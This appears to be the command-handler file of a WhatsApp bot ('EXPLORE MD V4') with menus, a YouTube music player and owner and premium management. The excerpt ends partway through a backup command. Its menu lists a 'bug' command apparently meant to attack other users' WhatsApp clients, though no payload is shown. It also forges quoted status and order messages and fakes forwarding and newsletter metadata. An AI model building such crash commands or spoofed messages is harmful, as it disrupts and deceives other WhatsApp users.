/*

<!>  #Creator( REDDRAGON DFS ) ©2024- REDDRAGON

This is a simple WhatsApp bot base I created, so feel free to use it if you're interested.

#Developer ( REDDRAGON DFS ) ©2024- REDDRAGON

Don't Remove This Credits

*/ 

require('./config') 

const { 

  default: baileys, proto, jidNormalizedUser, generateWAMessage, 

  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 

} = require("@whiskeysockets/baileys");

const { 

  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 

  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 

  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 

  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 

  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 

  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 

  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 

  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 

  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 

  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 

  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 

  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 

  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 

  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 

  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 

  templateMessage, InteractiveMessage, Header 

} = require("@whiskeysockets/baileys");

const fs = require('fs')

const util = require('util')

const chalk = require('chalk')

const os = require('os')

const axios = require('axios')

const fsx = require('fs-extra')

const crypto = require('crypto')

const ffmpeg = require('fluent-ffmpeg')

const sharp = require('sharp')

const jimp = require("jimp")

const moment = require('moment-timezone')

const { exec, spawn, execSync } = require('child_process');
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./lib/scraper');
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./system/storage')

const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('./system/exif.js')

const babi = fs.readFileSync('./system/image/Hot.jpeg')

// Music player dependencies

const ytdl = require('ytdl-core');

const yts = require('yt-search');

const path = require('path');

// MusicPlayer class

class MusicPlayer {

    constructor() {

        this.downloadsDir = './system/cache/music';

        if (!fs.existsSync(this.downloadsDir)) {

            fs.mkdirSync(this.downloadsDir, { recursive: true });

        }

    }

    async searchYouTube(query) {

        try {

            const searchResults = await yts(query);

            return searchResults.videos.slice(0, 5).map(video => ({

                title: video.title,

                url: video.url,

                duration: video.duration.timestamp,

                thumbnail: video.thumbnail

            }));

        } catch (error) {

            console.error('Search error:', error);

            return [];

        }

    }

    async playYouTubeAudio(client, m, url) {

        try {

            await m.reply('🎵 Downloading music...');

            const videoInfo = await ytdl.getInfo(url);

            const audioFormat = ytdl.chooseFormat(videoInfo.formats, { 

                quality: 'highestaudio',

                filter: 'audioonly'

            });

            if (!audioFormat) {

                return m.reply('❌ No audio format found for this video');

            }

            const title = videoInfo.videoDetails.title;

            const safeTitle = title.replace(/[^a-zA-Z0-9]/g, '_');

            const filePath = path.join(this.downloadsDir, `${safeTitle}.mp3`);

            // Download the audio

            const stream = ytdl(url, { format: audioFormat });

            const writeStream = fs.createWriteStream(filePath);

            stream.pipe(writeStream);

            writeStream.on('finish', async () => {

                try {

                    // Send the audio file

                    await client.sendMessage(m.chat, {

                        audio: fs.readFileSync(filePath),

                        mimetype: 'audio/mpeg',

                        fileName: `${title}.mp3`

                    }, { quoted: m });

                    // Clean up

                    fs.unlinkSync(filePath);

                    

                } catch (error) {

                    console.error('Error sending audio:', error);

                    m.reply('❌ Failed to send audio');

                }

            });

            writeStream.on('error', (error) => {

                console.error('Download error:', error);

                m.reply('❌ Download failed');

            });

        } catch (error) {

            console.error('Play error:', error);

            m.reply('❌ Error playing music');

        }

    }

}

// Initialize music player

const musicPlayer = new MusicPlayer();

module.exports = client = async (client, m, chatUpdate, store) => {

const { from } = m

try {

      

const body = (

    m.mtype === "conversation" ? m.message.conversation :

    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :

    m.mtype === "imageMessage" ? m.message.imageMessage.caption :

    m.mtype === "videoMessage" ? m.message.videoMessage.caption :

    m.mtype === "documentMessage" ? m.message.documentMessage.caption || "" :

    m.mtype === "audioMessage" ? m.message.audioMessage.caption || "" :

    m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "" :

    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :

    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :

    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :

    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :

    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 

    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text :

    m.mtype === "reactionMessage" ? m.message.reactionMessage.text :

    m.mtype === "contactMessage" ? m.message.contactMessage.displayName :

    m.mtype === "contactsArrayMessage" ? m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :

    m.mtype === "locationMessage" ? `${m.message.locationMessage.degreesLatitude}, ${m.message.locationMessage.degreesLongitude}` :

    m.mtype === "liveLocationMessage" ? `${m.message.liveLocationMessage.degreesLatitude}, ${m.message.liveLocationMessage.degreesLongitude}` :

    m.mtype === "pollCreationMessage" ? m.message.pollCreationMessage.name :

    m.mtype === "pollUpdateMessage" ? m.message.pollUpdateMessage.name :

    m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :

    m.mtype === "viewOnceMessage" ? (m.message.viewOnceMessage.message.imageMessage?.caption || 

                                     m.message.viewOnceMessage.message.videoMessage?.caption || 

                                     "[View once message]") :

    m.mtype === "viewOnceMessageV2" ? (m.message.viewOnceMessageV2.message.imageMessage?.caption || 

                                       m.message.viewOnceMessageV2.message.videoMessage?.caption || 

                                       "[View once message]") :

    m.mtype === "viewOnceMessageV2Extension" ? (m.message.viewOnceMessageV2Extension.message.imageMessage?.caption || 

                                                m.message.viewOnceMessageV2Extension.message.videoMessage?.caption || 

                                                "[View once message]") :

    m.mtype === "ephemeralMessage" ? (m.message.ephemeralMessage.message.conversation ||

                                      m.message.ephemeralMessage.message.extendedTextMessage?.text || 

                                      "[Ephemeral message]") :

    m.mtype === "interactiveMessage" ? "[Interactive message]" :

    m.mtype === "protocolMessage" ? "[Message was deleted]" :

    ""

);

const budy = (typeof m.text == 'string' ? m.text: '')

const prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix

const owner = JSON.parse(fs.readFileSync('./system/owner.json'))

const Premium = JSON.parse(fs.readFileSync('./system/Premium.json'))

const OwnerJasher = JSON.parse(fs.readFileSync('./system/Ownj.json'))

const isCmd = body.startsWith(prefix)

const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''

const args = body.trim().split(/ +/).slice(1)

const botNumber = await client.decodeJid(client.user.id)

const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)

const isDev = owner

  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')

  .includes(m.sender)

const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)

const isOwnJasher = [botNumber, ...OwnerJasher].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)

const text = q = args.join(" ")

const quoted = m.quoted ? m.quoted : m

const from = m.key.remoteJid

const { spawn: spawn, exec } = require('child_process')

const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid

const groupMetadata = m.isGroup ? await client.groupMetadata(from).catch(e => {}) : ''

const participants = m.isGroup ? await groupMetadata.participants : ''

const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''

const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false

const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false

const groupName = m.isGroup ? groupMetadata.subject : "";

const pushname = m.pushName || "No Name"

const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')

const mime = (quoted.msg || quoted).mimetype || ''

const todayDateWIB = new Date().toLocaleDateString('id-ID', {

  timeZone: 'Asia/Jakarta',

  year: 'numeric',

  month: 'long',

  day: 'numeric',

});

if (!client.public) {

if (!isCreator) return

}

if (command) {

  if (m.isGroup) {

    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));

    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(

      ` 📅 Date : ${todayDateWIB} \n` +

      ` 🕐 Clock : ${time} \n` +

      ` 💬 Message Received : ${command} \n` +

      ` 🌐 Group Name : ${groupName} \n` +

      ` 🔑 Group Id : ${m.chat} \n` +

      ` 👤 Recipient : ${botNumber} \n`

    ));

  } else {

    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));

    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(

      ` 📅 Date : ${todayDateWIB} \n` +

      ` 🕐 Clock : ${time} \n` +

      ` 💬 Message Received : ${command} \n` +

      ` 🗣️ Sender : ${pushname} \n` +

      ` 🌐 Group Name : No In Group \n` +

      ` 🔑 Group Id : No In Group \n` +

      ` 👤 Recipient : ${botNumber} \n`

    ));

  }

}

const CHANNELS_FILE = "./system/savesaluran.json";

function loadChannels() {

    if (fs.existsSync(CHANNELS_FILE)) {

        return JSON.parse(fs.readFileSync(CHANNELS_FILE, "utf-8"));

    }

    return [];

}

function saveChannels(data) {

    fs.writeFileSync(CHANNELS_FILE, JSON.stringify(data, null, 2));

}

global.channels = loadChannels();

function capital(string) {

  return string.charAt(0).toUpperCase() + string.slice(1);

}

const imageList = [

    "https://files.catbox.moe/ucn86r.jpg"

];

const RandomMenu = imageList[Math.floor(Math.random() * imageList.length)];

const example = (teks) => {

return `Usage: ${prefix + command} ${teks}`

}

const ReplyButton = (teks) => {

const userMode = global.menuMode || 'nobutton';

if (userMode === 'nobutton') {

client.sendMessage(m.chat, {

        text: teks,

        contextInfo: {

            externalAdReply: {

                showAdAttribution: true,

                title: `EXPLORE MD V4 🕊️`,

                body: `© REDDRAGON DFS`,

                mediaType: 3,

                renderLargerThumbnail: false,

                thumbnailUrl: RandomMenu,

                sourceUrl: `https://whatsapp.com/channel/0029Vb4HUnJAjPXOWnELU82J`

            }

        }

    }, { quoted: lol });

}

const buttons = [

    {

      buttonId: '.menu',

      buttonText: {

        displayText: 'Menu'

      }

    }

  ];

  const buttonMessage = {

    image: { url: RandomMenu },

    caption: teks,

    footer: 'REDDRAGON DFS 🕊',

    buttons: buttons,

    headerType: 6,

    contextInfo: { 

      forwardingScore: 99999,

      isForwarded: true,

      forwardedNewsletterMessageInfo: {

        newsletterJid: "120363417125798240@newsletter",

        serverMessageId: null,

        newsletterName: `EXPLORE MD V4`

      },

      mentionedJid: ['27634988679@s.whatsapp.net'],

    },

    viewOnce: true

  };

  return client.sendMessage(m.chat, buttonMessage, { quoted: lol });

}

const ReplyButtonMenu = (teks) => {

const userMode = global.menuMode || 'nobutton';

if (userMode === 'nobutton') {

client.sendMessage(m.chat, {

  image: { url: RandomMenu },

  caption: teks,

  footer: "EXPLORE MD V4\nREDDRAGON DFS",

  headerType: 4,

  hasMediaAttachment: true,

  contextInfo: {

    mentionedJid: [m.chat],

    participant: "0@s.whatsapp.net",

    remoteJid: "status@broadcast",

    forwardingScore: 99999,

    isForwarded: true,

    forwardedNewsletterMessageInfo: {

      newsletterJid: "120363417125798240@newsletter",

      serverMessageId: 1,

      newsletterName: "EXPLORE MD V4"

    }

  }

}, { quoted: lol });

}

const buttons = [

    {

      buttonId: '.allmenu',

      buttonText: {

        displayText: 'Allmenu'

    }

  },

  {

      buttonId: '.tqto',

      buttonText: {

        displayText: 'Credits'

      }

    }

  ];

  const buttonMessage = {

    image: { url: RandomMenu },

    caption: teks,

    footer: 'REDDRAGON DFS',

    buttons: buttons,

    headerType: 6,

    contextInfo: { 

      forwardingScore: 99999,

      isForwarded: true,

      forwardedNewsletterMessageInfo: {

        newsletterJid: "120363417125798240@newsletter",

        serverMessageId: null,

        newsletterName: `EXPLORE MD V4`

      },

      mentionedJid: ['27634988679@s.whatsapp.net'],

    },

    viewOnce: true

  };

  return client.sendMessage(m.chat, buttonMessage, { quoted: lol });

}

const lol = {

  key: {

    fromMe: false,

    participant: "0@s.whatsapp.net",

    remoteJid: "status@broadcast"

  },

  message: {

    orderMessage: {

      orderId: "2009",

      thumbnail: babi,

      itemCount: "9999",

      status: "INQUIRY",

      surface: "",

      message: `—!s\`EXPLORE MD V4 🎭\ncommand from: @${m.sender.split('@')[0]}`,

      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="

    }

  },

  contextInfo: {

    mentionedJid: ["120363417125798240@newsletter"],

    forwardingScore: 999,

    isForwarded: true,

  }

}

const more = String.fromCharCode(8206)

const readmore = more.repeat(4001)

const namaOrang = m.pushName || "No Name";

const info = `${namaOrang}`;

//=================================================//

// Command Menu

//=================================================//

switch(command) {

case 'setmenu': {

  const selected = args[0]?.toLowerCase();

  if (!['button', 'nobutton'].includes(selected)) {

    return m.reply(`*Usage :*\n.setmenu button\n.setmenu nobutton`);

  }

  global.menuMode = selected; // Change globally, not per user

  return m.reply(`✅ All user menu display has been changed to *${selected.toUpperCase()}* mode.`);

}

break

case 'start':

case 'gyzen':

case 'menu': {

let Menu = `( 👋🏻 ) - Hello, ${info}!

> Select the menu display .setmenu

\`── Information\`

\`⭔\` Developer : REDDRAGON DFS

\`⭔\` Mode : ${client.public ? "Public Bot" : "Private Bot"}

\`⭔\` Status : ${isCreator ? "Owner User" : isPremium ? "Premium User" : "Not Acces"}

\`⭔ Runtime : ${runtime(process.uptime())}\`

╭━≫〖 MENU 〗↯

│ 流 ownermenu

│ 流 jpmmenu

│ 流 downloadermenu

│ 流 othersmenu

┃ 流 bugmenu

│ 流 allmenu

│ 流 groupmenu

┗━━━━━━━━━━━━━━━━━〣

➣ INFORMATION UPDATE 』

https://whatsapp.com/channel/0029Vb4HUnJAjPXOWnELU82J`

ReplyButtonMenu(Menu)

}

break
case "groupmenu": {

let Menu = `( 👋🏻 ) - Hello, ${info}!

> Select the menu display .setmenu

\`── Information\`

\`⭔\` Developer : DFS

\`⭔\` Mode : ${client.public ? "Public Bot" : "Private Bot"}

\`⭔\` Status : ${isCreator ? "Owner User" : isPremium ? "Premium User" : "Not Acces"}

\`⭔ Runtime : ${runtime(process.uptime())}\`

╭━≫〖 GROUP MENU 〗↯

│ 流 kick

│ 流 ban

│ 流 mute

│ 流 warn

┃ 流 unwarn

│ 流 warnings

│ 流lock

│ 流unlock

│ 流antilink

│ 流antispam

│ 流 promote

│ 流 demote

│ 流 invite

┃ 流 link

│ 流 revoke

│ 流 setdesc

│ 流 setname

│ 流 groupinfo

│ 流 members

│ 流 list

│ 流 tagall

│ 流 leave

│ 流 add

│ 流 seticon

│ 流 mutegroup

│ 流 unmutegroup

│ 流 listadmins

│ 流 admins

┗━━━━━━━━━━━━━━━━━〣`

ReplyButtonMenu(Menu)

}
        
break
        
case "jpmmenu": {

let Menu = `( 👋🏻 ) - Hello, ${info}!

> Select the menu display .setmenu

\`── Information\`

\`⭔\` Developer : DFS

\`⭔\` Mode : ${client.public ? "Public Bot" : "Private Bot"}

\`⭔\` Status : ${isCreator ? "Owner User" : isPremium ? "Premium User" : "Not Acces"}

\`⭔ Runtime : ${runtime(process.uptime())}\`

╭━≫〖 JPM MENU 〗↯

│ 流 jpm

│ 流 jpmht

│ 流 jpmvip

│ 流 jpmchvip

┃ 流 addidch

│ 流 delidch

┗━━━━━━━━━━━━━━━━━〣`

ReplyButtonMenu(Menu)

}

break

case 'ownermenu': {

let Menu = `( 👋🏻 ) - Hello, ${info}!

> Select the menu display .setmenu

\`── Information\`

\`⭔\` Developer : REDDRAGON DFS

\`⭔\` Mode : ${client.public ? "Public Bot" : "Private Bot"}

\`⭔\` Status : ${isCreator ? "Owner User" : isPremium ? "Premium User" : "Not Acces"}

\`⭔ Runtime : ${runtime(process.uptime())}\`

╭━≫〖 OWNER MENU 〗↯

│ 流 addprem

│ 流 delprem

│ 流 listprem

│ 流 addown

│ 流 delown

│ 流 listown

│ 流 addownj

┃ 流 delownj

│ 流 listownj

│ 流 self

│ 流 public

│ 流 join

┗━━━━━━━━━━━━━━━━━〣`

ReplyButtonMenu(Menu)

}

break

case 'downloadermenu': {

let Menu = `( 👋🏻 ) - Hello, ${info}!

> Select the menu display .setmenu

\`── Information\`

\`⭔\` Developer : REDDRAGON DFS

\`⭔\` Mode : ${client.public ? "Public Bot" : "Private Bot"}

\`⭔\` Status : ${isCreator ? "Online" : isPremium ? "Premium User" : "Not Acces"}

\`⭔ Runtime : ${runtime(process.uptime())}\`

╭━≫〖 DOWNLOADER MENU 〗↯

│ 流 song

│ 流 play

│ 流 sticker

│ 流 s

┃ 流 spotify

│ 流 stickeremoji

│ 流 ste

│ 流 meme

│ 流 quote

│ 流 ytsearch

┃ 流 lyrics

│ 流 igdl

┃ 流 fbdl

│ 流 twtdl  

│ 流 img

│ 流 toaudio

│ 流 tovid

│ 流 compress

┗━━━━━━━━━━━━━━━━━〣`

ReplyButtonMenu(Menu)

}

break
case 'generalmenu': {

let Menu = `( 👋🏻 ) - Hello, ${info}!

> Select the menu display .setmenu

\`── Information\`

\`⭔\` Developer : REDDRAGON DFS

\`⭔\` Mode : ${client.public ? "Public Bot" : "Private Bot"}

\`⭔\` Status : ${isCreator ? "Online" : isPremium ? "Premium User" : "Not Acces"}

\`⭔ Runtime : ${runtime(process.uptime())}\`

 

╭━≫〖 GENERAL MENU 〗↯

│ 流 restart

│ 流 ping

│ 流 translate

│ 流 shorturl

┃ 流 qr

│ 流 text2speech

│ 流 speech2text

│ 流 encrypt

│ 流 decrypt

│ 流 password

│ 流 notes

│ 流 note

│ 流 calculate

│ 流 calc

│ 流 timer

│ 流 remind

┗━━━━━━━━━━━━━━━━━〣`

ReplyButtonMenu(Menu)

}
break

case 'othersmenu': {

let Menu = `( 👋🏻 ) - Hello, ${info}!

> Select the menu display .setmenu

\`── Information\`

\`⭔\` Developer : REDDRAGON DFS

\`⭔\` Mode : ${client.public ? "Public Bot" : "Private Bot"}

\`⭔\` Status : ${isCreator ? "Owner User" : isPremium ? "Premium User" : "Not Acces"}

\`⭔ Runtime : ${runtime(process.uptime())}\`

 

╭━≫〖 OTHERS MENU 〗↯

│ 流 tourl

│ 流 cekidch

│ 流 rvo

│ 流 reactch

┃ 流 clearsesi

│ 流 getsc

│ 流 hidetag

┗━━━━━━━━━━━━━━━━━〣`

ReplyButtonMenu(Menu)

}

break

case 'allmenu': {

let Menu = `( 👋🏻 ) - Hello, ${info}!

> Select the menu display .setmenu

\`── Information\`

\`⭔\` Developer : REDDRAGON DFS

\`⭔\` Mode : ${client.public ? "Public Bot" : "Private Bot"}

\`⭔\` Status : ${isCreator ? "Owner User" : isPremium ? "Premium User" : "Not Acces"}

\`⭔ Runtime : ${runtime(process.uptime())}\`

╭━≫〖 OWNER MENU 〗↯

│ 流 addprem

│ 流 delprem

│ 流 listprem

│ 流 addown

│ 流 delown

│ 流 listown

│ 流 addownj

┃ 流 delownj

│ 流 listownj

│ 流 self

│ 流 public

│ 流 join

┗━━━━━━━━━━━━━━━━━〣

 

╭━≫〖 JPM MENU 〗↯

│ 流 jpm

│ 流 jpmht

│ 流 jpmvip

│ 流 jpmchvip

┃ 流 addidch

│ 流 delidch

┗━━━━━━━━━━━━━━━━━〣
╭━≫〖 GROUP MENU 〗↯

│ 流 kick

│ 流 ban

│ 流 mute

│ 流 warn

┃ 流 unwarn

│ 流 warnings

│ 流lock

│ 流unlock

│ 流antilink

│ 流antispam

│ 流 promote

│ 流 demote

│ 流 invite

┃ 流 link

│ 流 revoke

│ 流 setdesc

│ 流 setname

│ 流 groupinfo

│ 流 members

│ 流 list

│ 流 tagall

│ 流 leave

│ 流 add

│ 流 seticon

│ 流 mutegroup

│ 流 unmutegroup

│ 流 listadmins

│ 流 admins

┗━━━━━━━━━━━━━━━━━〣
 ╭━≫〖 GENERAL MENU 〗↯

│ 流 restart

│ 流 ping

│ 流 translate

│ 流 shorturl

┃ 流 qr

│ 流 text2speech

│ 流 speech2text

│ 流 encrypt

│ 流 decrypt

│ 流 password

│ 流 notes

│ 流 note

│ 流 calculate

│ 流 calc

│ 流 timer

│ 流 remind

│ 流 

│ 流 

│ 流 

┃ 流 

│ 流 

┗━━━━━━━━━━━━━━━━━〣

 ╭━≫〖 DOWNLOADER MENU 〗↯

│ 流 song

│ 流 play

│ 流 sticker

│ 流 s

┃ 流 spotify

│ 流 stickeremoji

│ 流 ste

│ 流 meme

│ 流 quote

│ 流 ytsearch

┃ 流 lyrics

│ 流 igdl

┃ 流 fbdl

│ 流 twtdl  

│ 流 img

│ 流 toaudio

│ 流 tovid

│ 流 compress

┗━━━━━━━━━━━━━━━━━〣

╭━≫〖 BUG MENU 〗↯

│ 流 x-gyzen-combo-stakzy

┗━━━━━━━━━━━━━━━━━〣

 

╭━≫〖 OTHERS MENU 〗↯

│ 流 tourl

│ 流 cekidch

│ 流 rvo

│ 流 reactch

┃ 流 clearsesi

│ 流 getsc

│ 流 hidetag

┗━━━━━━━━━━━━━━━━━〣
╭━≫〖 FUN MENU (not yet fixed) 〗↯

│ 流 joke

│ 流 fact

│ 流 8ball

│ 流 coinflip

┃ 流 dice

│ 流 rps

│ 流 ttt

│ 流 wyr

│ 流 trivia

│ 流 compliment

│ 流 hug

│ 流 kiss

│ 流 pat

│ 流 slap

│ 流 kill

│ 流 cuddle

│ 流 rate

│ 流 roast

│ 流 quote

┗━━━━━━━━━━━━━━━━━〣

`

ReplyButtonMenu(Menu)

}

//=================================================//

// Command Owner

//=================================================//

break;

case 'addowner':

case 'addown': {

    if (!isCreator) return ReplyButton(mess.owner);

    

    let number;

    if (m.quoted) {

        number = m.quoted.sender.split('@')[0];

    } else if (m.mentionedJid?.length) {

        number = m.mentionedJid[0].split('@')[0];

    } else if (args[0]) {

        number = args[0].replace(/[^0-9]/g, '');

    } else {

        return ReplyButton(`Use with:\n• Tag\n• Reply\n• Number\n\nExample: ${prefix + command} 62xxx`);

    }

    let checkNumber = await client.onWhatsApp(number + "@s.whatsapp.net");

    if (!checkNumber.length) return ReplyButton("Invalid WhatsApp number!");

    if (!owner.includes(number)) owner.push(number);

    if (!Premium.includes(number)) Premium.push(number);

    fs.writeFileSync('./system/owner.json', JSON.stringify(owner));

    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));

    ReplyButton(`✅ Successfully added *@${number}* as Owner`, m.chat, { mentions: [number + '@s.whatsapp.net'] });

}

break;

case 'delowner':

case 'delown': {

    if (!isCreator) return ReplyButton(mess.owner);

    let number;

    if (m.quoted) {

        number = m.quoted.sender.split('@')[0];

    } else if (m.mentionedJid?.length) {

        number = m.mentionedJid[0].split('@')[0];

    } else if (args[0]) {

        number = args[0].replace(/[^0-9]/g, '');

    } else {

        return ReplyButton(`Use with:\n• Tag\n• Reply\n• Number\n\nExample: ${prefix + command} 62xxx`);

    }

    owner.splice(owner.indexOf(number), 1);

    Premium.splice(Premium.indexOf(number), 1);

    fs.writeFileSync('./system/owner.json', JSON.stringify(owner));

    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));

    ReplyButton(`❌ Owner *@${number}* successfully removed.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });

}

break;

case 'addpremium':

case 'addprem': {

    if (!isCreator) return ReplyButton(mess.owner);

    let number;

    if (m.quoted) {

        number = m.quoted.sender.split('@')[0];

    } else if (m.mentionedJid?.length) {

        number = m.mentionedJid[0].split('@')[0];

    } else if (args[0]) {

        number = args[0].replace(/[^0-9]/g, '');

    } else {

        return ReplyButton(`Use with:\n• Tag\n• Reply\n• Number\n\nExample: ${prefix + command} 62xxx`);

    }

    let ceknum = await client.onWhatsApp(number + "@s.whatsapp.net");

    if (!ceknum.length) return ReplyButton("Invalid number!");

    if (!Premium.includes(number)) Premium.push(number);

    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));

    ReplyButton(`✅ *@${number}* successfully became premium user.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });

}

break;

case 'delpremium':

case 'delprem': {

    if (!isCreator) return ReplyButton(mess.owner);

    let number;

    if (m.quoted) {

        number = m.quoted.sender.split('@')[0];

    } else if (m.mentionedJid?.length) {

        number = m.mentionedJid[0].split('@')[0];

    } else if (args[0]) {

        number = args[0].replace(/[^0-9]/g, '');

    } else {

        return ReplyButton(`Use with:\n• Tag\n• Reply\n• Number\n\nExample: ${prefix + command} 62xxx`);

    }

    let index = Premium.indexOf(number);

    if (index !== -1) {

        Premium.splice(index, 1);

        fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));

        ReplyButton(`❌ *@${number}* has been removed from premium list.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });

    } else {

        ReplyButton(`⚠️ *@${number}* is not registered as premium.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });

    }

}

break;

case 'listpremium':

case 'listprem': {

    if (!isCreator) return ReplyButton(mess.owner);

    if (Premium.length === 0) return ReplyButton("❌ No premium users.");

    

    let textList = `*📜 Premium Users List:*\n\n`;

    for (let i = 0; i < Premium.length; i++) {

        textList += `${i + 1}. wa.me/${Premium[i]}\n`;

    }

    return ReplyButton(textList);

}

break;

case 'listowner':

case 'listown': {

    if (!isCreator) return ReplyButton(mess.owner);

    if (owner.length === 0) return ReplyButton("❌ No Owner data.");

    let textList = `*👑 Bot Owner List:*\n\n`;

    for (let i = 0; i < owner.length; i++) {

        textList += `${i + 1}. wa.me/${owner[i]}\n`;

    }

    return ReplyButton(textList);

}

break;

case 'listownj':

case 'listownjasher': {

    if (!isCreator) return ReplyButton(mess.owner);

    if (OwnerJasher.length === 0) return ReplyButton("❌ No premium users.");

    

    let textList = `*📜 OwnerJasher Users List:*\n\n`;

    for (let i = 0; i < OwnerJasher.length; i++) {

        textList += `${i + 1}. wa.me/${OwnerJasher[i]}\n`;

    }

    return ReplyButton(textList);

}

break;

case 'addownj':

case 'addownjasher': {

    if (!isCreator) return ReplyButton(mess.owner);

    let number;

    if (m.quoted) {

        number = m.quoted.sender.split('@')[0];

    } else if (m.mentionedJid?.length) {

        number = m.mentionedJid[0].split('@')[0];

    } else if (args[0]) {

        number = args[0].replace(/[^0-9]/g, '');

    } else {

        return ReplyButton(`Use with:\n• Tag\n• Reply\n• Number\n\nExample: ${prefix + command} 62xxx`);

    }

    let ceknum = await client.onWhatsApp(number + "@s.whatsapp.net");

    if (!ceknum.length) return ReplyButton("Invalid number!");

    if (!OwnerJasher.includes(number)) OwnerJasher.push(number);

    fs.writeFileSync('./system/Ownj.json', JSON.stringify(OwnerJasher));

    ReplyButton(`✅ *@${number}* successfully became owner jasher user.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });

}

break;

case 'delownj':

case 'delownjasher': {

    if (!isCreator) return ReplyButton(mess.owner);

    let number;

    if (m.quoted) {

        number = m.quoted.sender.split('@')[0];

    } else if (m.mentionedJid?.length) {

        number = m.mentionedJid[0].split('@')[0];

    } else if (args[0]) {

        number = args[0].replace(/[^0-9]/g, '');

    } else {

        return ReplyButton(`Use with:\n• Tag\n• Reply\n• Number\n\nExample: ${prefix + command} 62xxx`);

    }

    let index = OwnerJasher.indexOf(number);

    if (index !== -1) {

        OwnerJasher.splice(index, 1);

        fs.writeFileSync('./system/Ownj.json', JSON.stringify(OwnerJasher));

        ReplyButton(`❌ *@${number}* has been removed from owner jasher list.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });

    } else {

        ReplyButton(`⚠️ *@${number}* is not registered as owner jasher.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });

    }

}

break;

case 'public': {

    if (!isCreator) return ReplyButton(mess.owner);

    client.public = true;

    ReplyButton("Bot set to public mode.");

}

break;

case 'private': case 'self': {

    if (!isCreator) return ReplyButton(mess.owner);

    client.public = false;

    ReplyButton("Bot set to private mode.");

}

break

case "restart": {

    if (!isCreator) return ReplyButton(mess.owner);

    ReplyButton("Restarting Bot.....");

    // Delay 3 seconds then exit

    setTimeout(() => {

        process.exit(1);

    }, 3000);

}

break

case "backup": case "getsc": case "ambilsc": case "backupsc": {

if (!isCreator) return ReplyButton(mess.owner);

let dir = await fs.readdirSync("./system/cache")

if (dir.length >= 2) {

let res = dir.filter(e => e !== "A")

for (let i of res) {

await fs.unlinkSync(`./system/cache/${i}`)

}}

await m.reply("Processing bot script backup")

var name = `EXPLORE-MD-V4-${global.versi}`

const ls = (await execSync("ls"))

.toString()

.split("\n")

.filter(

(pe) =>

pe != "node_modules" &&

pe != "session" &&

pe != "package-lock.json" &&

pe != "yarn.lock" &&

pe != ""

)

const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)

await client.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})

await execSync(`rm -rf ${name}.zip`)

